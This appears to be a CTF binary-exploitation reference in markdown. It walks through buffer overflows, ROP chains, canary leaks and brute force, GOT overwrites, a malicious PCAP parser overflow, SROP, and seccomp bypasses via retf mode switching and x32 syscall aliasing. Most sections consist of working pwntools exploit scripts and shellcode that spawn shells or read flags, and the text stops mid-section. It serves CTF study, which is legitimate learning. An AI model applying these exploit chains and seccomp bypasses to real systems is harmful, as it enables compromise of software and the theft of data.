pop_rdi_ret = 0x40150b   # pop rdi; ret
ret = 0x40101a           # ret (for stack alignment)
win_func = 0x4013ac
magic = 0x1337c0decafebeef

offset = 112 + 8  # = 120 bytes to reach return address

payload = b"A" * offset
payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
payload += p64(pop_rdi_ret)
payload += p64(magic)
payload += p64(win_func)
```

**Finding the win function:**
- Search for `fopen("flag.txt")` or similar in Ghidra
- Look for functions with no XREF that check a magic parameter
- Check for conditional print/exit patterns after parameter comparison

### Stack Alignment (16-byte Requirement)

Modern Ubuntu/glibc requires 16-byte stack alignment before `call` instructions. Symptoms of misalignment:
- SIGSEGV in `movaps` instruction (SSE requires alignment)
- Crash inside libc functions (printf, system, etc.)

**Fix:** Add extra `ret` gadget before your ROP chain:
```python
payload = b"A" * offset
payload += p64(ret)        # Align stack to 16 bytes
payload += p64(pop_rdi_ret)
# ... rest of chain
```

### Offset Calculation from Disassembly

```asm
push   %rbp
mov    %rsp,%rbp
sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
...
lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
mov    $0xf0,%edx        ; read() size = 240 (overflow!)
```

**Calculate offset:**
- Buffer starts at `rbp - buffer_offset` (e.g., rbp-0x70)
- Saved RBP is at `rbp` (0 offset from buffer end)
- Return address is at `rbp + 8`
- **Total offset = buffer_offset + 8** = 112 + 8 = 120 bytes

### Input Filtering (memmem checks)

Some challenges filter input using `memmem()` to block certain strings:
```python
payload = b"A" * 120 + p64(gadget) + p64(value)
assert b"badge" not in payload and b"token" not in payload
```

### Finding Gadgets

```bash
# Find pop rdi; ret
objdump -d binary | grep -B1 "pop.*rdi"
ROPgadget --binary binary | grep "pop rdi"

# Find simple ret (for alignment)
objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
```

### Hidden Gadgets in CMP Immediates

CMP instructions with large immediates encode useful byte sequences. pwntools `ROP()` finds these automatically:

```asm
# Example: cmpl $0xc35e415f, -0x4(%rbp)
# Bytes: 81 7d fc 5f 41 5e c3
#                  ^^ ^^ ^^ ^^
# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
# At +4: 41 5e c3    = pop r14; ret
# At +5: 5e c3       = pop rsi; ret
```

**When to look:** Small binaries with few functions often lack standard gadgets. Check `cmp`, `mov`, and `test` instructions with large immediates -- their operand bytes may decode as useful gadgets.

```python
rop = ROP(elf)
# pwntools finds these automatically
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget)
```

## Struct Pointer Overwrite (Heap Menu Challenges)

**Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.

**Struct layout example:**
```c
struct Student {
    char name[36];      // offset 0x00 - data buffer
    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
    float gpa;          // offset 0x28
};  // total: 0x2c (44 bytes)
```

**Exploitation:**
```python
from pwn import *

WIN = 0x08049316
GOT_TARGET = 0x0804c00c  # printf@GOT

# 1. Create object (allocates struct + sub-allocations)
create_student("AAAA", 5, 3.5)

# 2. Modify name - overflow into pointer field with GOT address
payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
modify_name(0, payload)

# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry

# 4. Trigger overwritten function -> jumps to win
```

**GOT target selection strategy:**
- Identify which libc functions the `win` function calls internally
- Do NOT overwrite GOT entries for functions used by `win` (causes infinite recursion/crash)
- Prefer functions called in the main loop AFTER the write

| Win uses | Safe GOT targets |
|----------|-------------------|
| puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
| printf, system | puts, exit, free |
| system only | puts, printf, exit |

## Signed Integer Bypass (Negative Quantity)

`scanf("%d")` without sign check; negative input bypasses unsigned comparisons. See [advanced-exploits.md](advanced-exploits.md#signed-integer-bypass-negative-quantity) for full details.

## Canary-Aware Partial Overflow

Overflow `valid` flag between buffer and canary without touching the canary. Use `./` as no-op path padding for precise length control. See [advanced-exploits.md](advanced-exploits.md#canary-aware-partial-overflow) for full exploit chain.

## OOB Read via Stride/Rate Leak (DiceCTF 2026)

**Pattern (ByteCrusher):** A string processing function walks input buffer with configurable stride (`rate`). When rate exceeds buffer size, it skips over the null terminator and reads adjacent stack data (canary, return address).

**Stack layout:**
```text
input_buf  [0-31]    <- user input (null at byte 31)
crushed    [32-63]   <- output buffer
canary     [72-79]   <- stack canary
saved rbp  [80-87]
return addr [88-95]  <- code pointer (defeats PIE)
```

**Vulnerable pattern:**
```c
void crush_string(char *input, char *output, int rate, int output_max_len) {
    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
        output[out_idx++] = input[i];  // rate > bufsize skips past null terminator
    }
}
```

**Exploitation:**
```python
from pwn import *

# Leak canary bytes 1-7 (byte 0 always 0x00)
canary = b'\x00'
for offset in range(73, 80):  # canary at offsets 72-79
    p.sendline(b'A' * 31)     # fill buffer (null at byte 31)
    p.sendline(str(offset).encode())  # rate = offset → reads input[0] then input[offset]
    p.sendline(b'2')           # output length = 2
    resp = p.recvline()
    canary += resp[1:2]        # second char is leaked byte

# Leak return address bytes 0-5 (top 2 always 0x00 in userspace)
ret_addr = b''
for offset in range(88, 94):
    p.sendline(b'A' * 31)
    p.sendline(str(offset).encode())
    p.sendline(b'2')
    resp = p.recvline()
    ret_addr += resp[1:2]

pie_base = u64(ret_addr.ljust(8, b'\x00')) - known_offset
admin_portal = pie_base + admin_offset

# Overflow gets() with leaked canary + computed address
payload = b'A' * 24 + canary + p64(0) + p64(admin_portal)
p.sendline(payload)
```

**When to use:** Any function that traverses a buffer with user-controlled step size and null-terminator-based stop condition.

**Key insight:** Stride-based OOB reads leak one byte per iteration by controlling which offset lands on the target byte. With enough iterations, leak full canary + return address to defeat both stack canary and PIE.

## Stack Canary Byte-by-Byte Brute Force on Forking Servers

**Pattern:** Server calls `fork()` for each connection. The child process inherits the same canary value. Brute-force the canary one byte at a time — each wrong byte crashes the child, but the parent continues with the same canary.

**Canary structure:** First byte is always `\x00` (prevents string function leaks). Remaining 7 bytes are random. Total: 8 bytes on x86-64, 4 on x86-32.

**Exploitation:**
```python
from pwn import *

OFFSET = 64  # bytes to canary (buffer size)
HOST, PORT = "target", 1337

def try_byte(known_canary, guess_byte):
    """Send overflow with known canary bytes + one guess. No crash = correct byte."""
    p = remote(HOST, PORT)
    payload = b'A' * OFFSET + known_canary + bytes([guess_byte])
    p.send(payload)
    try:
        resp = p.recv(timeout=1)
        p.close()
        return True   # No crash → byte is correct
    except:
        p.close()
        return False  # Crash → wrong byte

# Byte 0 is always \x00
canary = b'\x00'

# Brute-force bytes 1-7 (only 256 attempts per byte, 7*256 = 1792 total)
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_byte(canary, guess):
            canary += bytes([guess])
            print(f"Canary byte {byte_pos}: 0x{guess:02x}")
            break
    else:
        print(f"Failed at byte {byte_pos}")
        break

print(f"Full canary: {canary.hex()}")

# Now overflow with correct canary + ROP chain
p = remote(HOST, PORT)
payload = b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr)
p.sendline(payload)
```

**Prerequisites:**
- Server must `fork()` per connection (canary stays constant across children)
- Overflow must be controllable byte-by-byte (no all-at-once read)
- Distinguishable crash vs success response (timeout, error message, or connection behavior)

**Expected attempts:** 7 * 128 = 896 average (7 bytes * 128 average guesses per byte). Maximum 7 * 256 = 1792.

**Key insight:** `fork()` preserves the canary across child processes. Brute-forcing 8 bytes sequentially (7 * 256 = 1792 attempts) is vastly more efficient than brute-forcing all 8 bytes simultaneously (2^56 attempts).

---

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.

---

## Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)

Custom network protocols that echo data based on a length field in the request header can leak stack memory when the length exceeds the actual data sent (similar to Heartbleed).

```python
from pwn import *

# Custom protocol: [4-byte magic][1-byte length][payload]
# Server echoes back `length` bytes of the response buffer
# If length > actual payload, server leaks stack/heap memory

io = remote('target.ctf', 1337)

# Normal request: 5 bytes of data, length = 5
# Bleeding request: 5 bytes of data, length = 255
magic = b'\x00\x01\x02\x03'
length_field = b'\xff'  # request 255 bytes back
payload = b'AAAAA'      # only send 5 bytes

io.send(magic + length_field + payload)
leaked = io.recv(255)

# Search leaked memory for flag pattern
if b'flag{' in leaked or b'CTF{' in leaked:
    log.success(f"Flag found in leaked data!")

# Alternatively, search for addresses (libc pointers, stack addresses)
for i in range(0, len(leaked) - 8, 8):
    addr = u64(leaked[i:i+8])
    if 0x7f0000000000 < addr < 0x7fffffffffff:
        log.info(f"Possible libc/stack address at offset {i}: {hex(addr)}")
```

**Key insight:** Any protocol where the server uses a client-supplied length to determine how much data to return is vulnerable to overread attacks. The server reads beyond the actual buffer into adjacent stack/heap memory, leaking sensitive data including flags, addresses, and canaries.

---

## Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)

**Pattern (PCAP Trap):** Custom file parser (e.g., PCAP, image, archive) allocates a fixed-size stack buffer but allows input records with lengths exceeding the buffer. A `memcpy` copies the full record into the stack buffer before length validation, overwriting saved registers and return address.

```python
from pwn import *

# Example: PCAP parser with 0x10000 byte stack buffer
# but PCAP packets can specify up to 0x20000 bytes (snaplen)
# memcpy(stack_buf, packet_data, packet_len) has no bounds check

elf = ELF('./pcap_parser')
context.binary = elf

# Step 1: Determine overflow offset
# Buffer is 0x10000 bytes on stack
# After buffer: saved callee-save registers (rbx, r12, ...) then return address
BUF_SIZE = 0x10000
# Offset to saved registers depends on function prologue
# Check disassembly: push rbx; push r12; sub rsp, 0x10000
OFFSET_RBX = BUF_SIZE       # first saved register
OFFSET_R12 = BUF_SIZE + 8   # second saved register
OFFSET_RET = BUF_SIZE + 16  # return address

# Step 2: Craft payload with register restoration
# Callee-saved registers must be valid or the function epilogue crashes
# rbx: point to readable memory (e.g., BSS) to avoid SIGSEGV on dereference
# r12: set to value that exits cleanly (e.g., loop terminator = 1)

bss_addr = elf.bss()         # Readable memory for rbx
win_addr = elf.symbols['win'] # Target function

payload = b'A' * BUF_SIZE
payload += p64(bss_addr)      # rbx -> valid readable address
payload += p64(1)             # r12 = 1 (loop exit condition)
payload += p64(elf.symbols['ret_gadget'])  # ret alignment gadget
payload += p64(win_addr)      # return to win()

# Step 3: Wrap in valid file format container
# For PCAP: valid global header + packet header with large caplen
import struct

# PCAP global header
pcap_header = struct.pack('<IHHIIII',
    0xa1b2c3d4,  # magic number
    2, 4,        # version 2.4
    0,           # thiszone
    0,           # sigfigs
    0x20000,     # snaplen (max packet size - larger than stack buffer!)
    1            # network (LINKTYPE_ETHERNET)
)

# PCAP packet record header
pkt_ts_sec = 0
pkt_ts_usec = 0
pkt_caplen = len(payload)   # captured length = our overflow payload
pkt_origlen = len(payload)

pkt_header = struct.pack('<IIII', pkt_ts_sec, pkt_ts_usec, pkt_caplen, pkt_origlen)

# Build malicious PCAP
pcap_data = pcap_header + pkt_header + payload

with open('exploit.pcap', 'wb') as f:
    f.write(pcap_data)

# Step 4: Send to target
p = remote('target', 1337)
p.send(pcap_data)
p.interactive()
```

**Key insight:** Custom file parsers often allocate fixed-size stack buffers based on a "maximum expected size" but the file format allows specifying larger records. The `memcpy` happens before the length check, creating a classic stack overflow. When exploiting, you must restore callee-saved registers to valid values in the overflow payload -- the function epilogue pops them before returning, and invalid values cause crashes before the return address is reached. Common requirements: `rbx` must point to readable memory (use BSS), loop counter registers must satisfy exit conditions.

**Callee-saved register restoration checklist:**
1. Identify which registers the function pushes in its prologue (`push rbx`, `push r12`, etc.)
2. Determine the order they are restored in the epilogue (reverse of push order)
3. Set `rbx` to any readable address (BSS, GOT, or known mapped page)
4. Set loop counters (`r12`, `r13`) to values that terminate any loops cleanly
5. Add a `ret` gadget for 16-byte stack alignment before the win function address

**When to recognize:** Challenge involves a custom parser for a binary file format (PCAP, ELF, image, protocol buffer). The parser uses `memcpy` or `read` with a length field from the input. Check if the buffer size is smaller than the maximum length the format allows.

**References:** MetaCTF Flash CTF 2026 "PCAP Trap"

---

## Stack Canary Null-Byte Overwrite Leak (CSAW 2017)

**Pattern:** Stack canaries always end with a null byte (the low byte is `\x00`) to prevent string-based leaks. If an overflow allows overwriting just that null byte with a non-null character, `puts()` or `printf("%s")` will continue printing past the overwritten byte and output the remaining 7 canary bytes. A return-to-main provides a second exploitation stage where the full canary is known.

**Stack layout:**
```text
[buffer] [canary \x00 XX XX XX XX XX XX XX] [saved rbp] [return addr]
                  ^--- overwrite only this byte with 'A'
                  → puts() now prints: 'A' + 7 canary bytes + (more stack data)
```

**Exploitation:**
```python
from pwn import *

# Stage 1: Overwrite canary's null byte, leak remaining 7 bytes via puts
p.send(b'A' * buf_size + b'B')   # 'B' overwrites the canary's null byte
leak = p.recvline()
# leak[buf_size] = 'B', leak[buf_size+1:buf_size+8] = 7 canary bytes
canary = b'\x00' + leak[buf_size + 1: buf_size + 8]
canary_val = u64(canary)
log.info(f"Leaked canary: {hex(canary_val)}")

# Stage 2: Return-to-main for clean second exploitation
# First stage payload returned to main() — now build full ROP chain
p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
```

**Why return-to-main:** After leaking the canary by overwriting its null byte, the canary is corrupted — the process will crash on return. Return-to-main (via a first-stage overflow) resets the stack frame cleanly and allows a second input with the now-known canary value.

**Key insight:** The canary's null byte terminator is a weakness — overwriting only it makes string functions print the canary value. Return-to-main provides a second exploitation opportunity with the leaked canary, enabling full ROP chain construction.

**References:** CSAW 2017


# rop-advanced

# CTF Pwn - Advanced ROP Techniques

## Table of Contents
- [Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)](#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026)
- [SROP with UTF-8 Payload Constraints (DiceCTF 2026)](#srop-with-utf-8-payload-constraints-dicectf-2026)
- [Seccomp Bypass](#seccomp-bypass)
- [RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)](#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026)
- [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
- [.fini_array Hijack](#fini_array-hijack)
- [pwntools Template](#pwntools-template)
  - [Automated Offset Finding via Corefile (Crypto-Cat)](#automated-offset-finding-via-corefile-crypto-cat)
- [ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)](#ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go)
  - [Step 1 — Stack leak](#step-1--stack-leak)
  - [Step 2 — Write `/bin/sh` to known address](#step-2--write-binsh-to-known-address)
  - [Step 3 — Find vDSO base via AT_SYSINFO_EHDR](#step-3--find-vdso-base-via-at_sysinfo_ehdr)
  - [Step 4 — Dump vDSO and find gadgets](#step-4--dump-vdso-and-find-gadgets)
  - [Step 5 — execve ROP chain](#step-5--execve-rop-chain)
- [Vsyscall ROP for PIE Bypass (Hack.lu 2015)](#vsyscall-rop-for-pie-bypass-hacklu-2015)
- [x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)](#x32-abi-syscall-number-aliasing-for-seccomp-bypass-bctf-2017)
- [Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)](#time-based-blind-shellcode-when-write-blocked-def-con-2017)
- [Useful Commands](#useful-commands)

For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).

---

## Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)

**Pattern (Eyeless):** Small stack overflow (22 bytes past buffer) — enough to overwrite RBP + RIP but too small for a ROP chain. No libc leak available. Use two `leave; ret` pivots to relocate execution to BSS, then chain `fgets` calls to write arbitrary-length ROP.

**Stage 1 — Pivot to BSS:**
```python
BSS_STAGE = 0x404500  # writable BSS address
LEAVE_RET = 0x4013d9  # leave; ret gadget

# Overflow: 128-byte buffer + RBP + RIP
payload = b'A' * 128
payload += p64(BSS_STAGE)   # overwrite RBP → BSS
payload += p64(LEAVE_RET)   # leave sets RSP = RBP (BSS), then ret
```

**Stage 2 — Chain fgets for large ROP:**
```python
# After pivot, RSP is at BSS_STAGE. Pre-place a mini-ROP there that
# calls fgets(BSS+0x600, 0x700, stdin) to read the real ROP chain:
POP_RDI = 0x4013a5
POP_RSI_R15 = 0x4013a3
SET_RDX_STDIN = 0x40136a  # gadget that sets rdx = stdin FILE*

stage2 = flat(
    SET_RDX_STDIN,
    POP_RDI, BSS_STAGE + 0x100,  # destination buffer
    POP_RSI_R15, 0x700, 0,       # size
    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
    BSS_STAGE + 0x100,            # return into the new ROP chain
)
```

**Key insight:** `leave; ret` is equivalent to `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls where RSP lands after `leave`. Two pivots solve the "too small for ROP" problem: first pivot moves to BSS where a small bootstrap ROP calls `fgets` to load the full exploit.

**When to use:** Overflow is too small for a full ROP chain AND the binary uses `fgets`/`read` (or similar input function) that can be called via PLT. BSS is always writable and at a known address (no PIE or PIE leaked).

---

## SROP with UTF-8 Payload Constraints (DiceCTF 2026)

**Pattern (Message Store):** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**

**Why SROP:** Normal ROP gadget addresses contain bytes >0x7f which are invalid single-byte UTF-8. SROP needs only 3 gadgets (set rax=15, call syscall) to trigger `sigreturn`, then a signal frame sets ALL registers for `execve("/bin/sh", NULL, NULL)`.

**UTF-8 multi-byte spanning trick:** Register fields in the signal frame are 8 bytes each, packed contiguously. A 3-byte UTF-8 sequence can start in one field and end in the next:

```python
from pwn import *

# r15 is the field immediately before rdi in the sigframe
# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F, ...]
# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq

# ROP preamble: 3 UTF-8-safe gadgets
payload = b'\x00' * 0x48           # padding to return address
payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
payload += p64(15)
payload += p64(syscall_ret)        # trigger sigreturn
payload += bytes(frame)
# Place "/bin/sh\0" at offset 0x178 in BUFFER
```

**When to use:** Any exploit where payload bytes pass through UTF-8 validation (Rust `String`, `from_utf8`, JSON parsers). SROP minimizes the number of gadget addresses that must be UTF-8-safe.

**Key insight:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in structured data (signal frames, ROP chains). Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`:
- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`

**Check rules:** `seccomp-tools dump ./binary`

See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.

## RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)

**Pattern (Eyeless):** Seccomp blocks `execve`, `execveat`, `open`, `openat` in 64-bit mode. Switch to 32-bit (IA-32e compatibility mode) where syscall numbers differ and the filter does not apply.

**How it works:** The `retf` (far return) instruction pops RIP then CS from the stack. Setting `CS = 0x23` switches the CPU to 32-bit compatibility mode. In 32-bit mode, `int 0x80` uses different syscall numbers: `open=5`, `read=3`, `write=4`, `exit=1`.

**ROP chain to switch modes:**
```python
POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
POP_RDI     = 0x4013a5
POP_RSI_R15 = 0x4013a3
RETF        = libc_base + 0x294bf   # retf gadget in libc

# Step 1: mprotect BSS as RWX for shellcode
rop  = flat(POP_RDI, 0x404000)          # addr = BSS page
rop += flat(POP_RSI_R15, 0x1000, 0)     # size = page
rop += flat(POP_RDX_RBX, 7, 0)          # prot = RWX
rop += flat(libc_base + libc.sym.mprotect)

# Step 2: Far return to 32-bit shellcode on BSS
rop += flat(RETF)
rop += p32(0x404a80)   # 32-bit EIP (shellcode address on BSS)
rop += p32(0x23)        # CS = 0x23 (IA-32e compatibility mode)
```

**32-bit shellcode (open/read/write flag):**
```nasm
mov esp, 0x404100       ; set up 32-bit stack
push 0x67616c66         ; "flag" (reversed)
push 0x2f2f2f2f         ; "////"
mov ebx, esp            ; ebx = filename pointer

mov eax, 5              ; SYS_open (32-bit)
xor ecx, ecx            ; O_RDONLY
int 0x80                ; open("////flag", O_RDONLY)

mov ebx, eax            ; fd from open
mov ecx, esp            ; buffer
mov edx, 0x100          ; size
mov eax, 3              ; SYS_read (32-bit)
int 0x80

mov edx, eax            ; bytes read
mov ecx, esp            ; buffer
mov ebx, 1              ; stdout
mov eax, 4              ; SYS_write (32-bit)
int 0x80

mov eax, 1              ; SYS_exit
int 0x80
```

**Key insight:** Seccomp filters configured for `AUDIT_ARCH_X86_64` do not check 32-bit `int 0x80` syscalls. The `retf` gadget (found in libc) switches architecture by loading CS=0x23. Requires making a memory region executable first via `mprotect`, since 32-bit shellcode must run from writable+executable memory.

**Finding retf in libc:**
```bash
ROPgadget --binary libc.so.6 | grep retf
# Or search for byte 0xcb:
objdump -d libc.so.6 | grep -w retf
```

**When to use:** Seccomp blocks critical 64-bit syscalls (`open`, `openat`, `execve`) but does not use `SECCOMP_FILTER_FLAG_SPEC_ALLOW` or check `AUDIT_ARCH`. Combine with `mprotect` to make BSS/heap executable for the 32-bit shellcode.

---

## Stack Shellcode with Input Reversal

**Pattern (Scarecode):** Binary reverses input buffer before returning.

**Strategy:**
1. Leak address via info-leak command (bypass PIE)
2. Find `sub rsp, 0x10; jmp *%rsp` gadget
3. Pre-reverse shellcode and RIP overwrite bytes
4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode

**Null-byte avoidance with `scanf("%s")`:**
- Can't embed `\x00` in payload
- Use partial pointer overwrite (6 bytes) -- top 2 bytes match since same mapping
- Use short jumps and NOP sleds instead of multi-address ROP chains

## .fini_array Hijack

**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO.

```python
# Find .fini_array address
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Or: objdump -h binary | grep fini_array

# Overwrite with format string %hn (2-byte writes)
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.

## pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

def conn():
    if args.GDB:
        return gdb.debug([exe], gdbscript='init-pwndbg\ncontinue')
    elif args.REMOTE:
        return remote('host', port)
    return process('./binary')

io = conn()
# exploit here
io.interactive()
```

### Automated Offset Finding via Corefile (Crypto-Cat)

Automatically determine buffer overflow offset without manual `cyclic -l`:
```python
def find_offset(exe):
    p = process(exe, level='warn')
    p.sendlineafter(b'>', cyclic(500))
    p.wait()
    # x64: read saved RIP from stack pointer
    offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    # x86: use pc directly
    # offset = cyclic_find(p.corefile.pc)
    log.warn(f'Offset: {offset}')
    return offset
```

**Key insight:** pwntools auto-generates a core file from the crashed process. Reading the saved return address from `corefile.sp` (x64) or `corefile.pc` (x86) and passing it to `cyclic_find()` gives the exact offset. Eliminates manual GDB inspection.

## ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)

**Pattern:** Statically-linked binary with minimal functions and zero useful ROP gadgets (no `pop rdi`, `pop rsi`, `pop rax`, etc.). The Linux kernel maps a vDSO (Virtual Dynamic Shared Object) into every process, and it contains enough gadgets for `execve`.

### Step 1 — Stack leak

Overflow a buffer and read back more bytes than sent to leak stack pointers:
```python
p.send(b'A' * 0x20)
resp = p.recv(0x80)
leak = u64(resp[0x30:0x38])
stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
```

### Step 2 — Write `/bin/sh` to known address

Use the binary's own `read` function via ROP to place `/bin/sh\0` at a page-aligned stack address:
```python
payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
p.sendline(payload)
p.send(b'/bin/sh\x00')
```

### Step 3 — Find vDSO base via AT_SYSINFO_EHDR

Dump the stack using the binary's `write` function. Search for `AT_SYSINFO_EHDR` (auxv type `0x21`) which holds the vDSO base address:
```python
# Dump 0x21000 bytes from stackbase
for i in range(0, len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:  # AT_SYSINFO_EHDR
        next_val = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
            vdso_base = next_val
            break
```

### Step 4 — Dump vDSO and find gadgets

Dump 0x2000 bytes from `vdso_base` using the binary's `write` function, then search for gadgets. Common vDSO gadgets:
```python
POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
```

### Step 5 — execve ROP chain

```python
payload = b'A' * 32
payload += p64(POP_RDX_RAX_RET)
payload += p64(0x0)              # rdx = NULL (envp)
payload += p64(59)               # rax = execve
payload += p64(POP_RBX_R12_RBP_RET)
payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
payload += p64(0x0)              # r12 → rsi = NULL (argv)
payload += p64(0xdeadbeef)       # rbp (dummy)
payload += p64(MOV_RDI_RBX_SYSCALL)
```

**Key insight:** The vDSO is kernel-specific — different kernels have different gadget offsets. Always dump the remote vDSO rather than assuming local offsets. The auxv `AT_SYSINFO_EHDR` (type 0x21) on the stack is the reliable way to find the vDSO base address.

**Detection:** Statically-linked binary with few functions, no libc, and no useful gadgets. QEMU-hosted challenges often run custom kernels with unique vDSO layouts.

---

## Vsyscall ROP for PIE Bypass (Hack.lu 2015)

On older Linux kernels, vsyscall page is mapped at a fixed address (`0xffffffffff600000-0xffffffffff601000`) regardless of ASLR/PIE. Each vsyscall entry ends with `ret`, providing gadgets at known addresses:

- `0xffffffffff600000` — gettimeofday (ret at +0x9)
- `0xffffffffff600400` — time (ret at +0x9)
- `0xffffffffff600800` — getcpu (ret at +0x9)

Use vsyscall `ret` gadgets to slide the stack to a partial return address overwrite:

```python
from pwn import *

payload = b'A' * 72                      # padding to return address
payload += p64(0xffffffffff600400)        # vsyscall time: acts as NOP-ret
payload += p64(0xffffffffff600400)        # second NOP-ret for alignment
payload += b"\x8b\x10"                    # partial overwrite to target (2 bytes)
```

**Key insight:** Vsyscall addresses are fixed even with PIE+ASLR. Modern kernels emulate vsyscalls (trap to kernel), but the addresses remain predictable. Check with `cat /proc/self/maps | grep vsyscall`.

**Note:** Some newer kernels disable vsyscall entirely (`vsyscall=none`). Verify availability before relying on this technique.

---

## x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)

**Pattern:** Linux x32 ABI (32-bit pointers on 64-bit kernel) uses syscall numbers with bit 30 set (`0x40000000`). Most seccomp BPF filters only check the low 32 bits against known syscall numbers, missing the x32 variants.

```c
// Standard execve blocked by seccomp: syscall 59
// x32 ABI variant: syscall 0x40000000 | 59 = 0x4000003B
// Often passes through BPF filters that check for exact match on 59
syscall(0x4000003B, "/bin/sh", NULL, NULL);
```

```python
from pwn import *

# ROP chain using x32 ABI syscall number to bypass seccomp
pop_rax = libc_base + rax_gadget
pop_rdi = libc_base + rdi_gadget
pop_rsi = libc_base + rsi_gadget
pop_rdx = libc_base + rdx_gadget
syscall_ret = libc_base + syscall_gadget

rop = flat(
    pop_rax, 0x4000003B,              # x32 execve (bypasses seccomp)
    pop_rdi, binsh_addr,              # "/bin/sh"
    pop_rsi, 0,                       # argv = NULL
    pop_rdx, 0,                       # envp = NULL
    syscall_ret,                      # trigger x32 execve
)
```

**Key insight:** The x32 ABI ORs `0x40000000` into syscall numbers. Seccomp filters checking for `SCMP_ACT_KILL` on `__NR_execve` (59) miss `__NR_execve | __X32_SYSCALL_BIT` (0x4000003B), which the kernel still dispatches to the same handler. This works on kernels compiled with `CONFIG_X86_X32=y` (common on older distributions).

**When to recognize:** Seccomp filter blocks specific syscall numbers via exact match or range check. Dump the BPF with `seccomp-tools dump ./binary` and check whether it validates the `AUDIT_ARCH` or masks off the x32 bit before comparing. If neither, x32 aliasing bypasses the filter.

**Mitigation check:** Modern seccomp policies use `SECCOMP_RET_KILL_PROCESS` and verify `AUDIT_ARCH_X86_64` explicitly, blocking this technique.

**References:** BCTF 2017

---

## Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)

**Pattern:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), use a timing side-channel to exfiltrate flag data character-by-character: compare each byte against a guess, loop on match.

```nasm
; Read flag into buffer, then compare character N
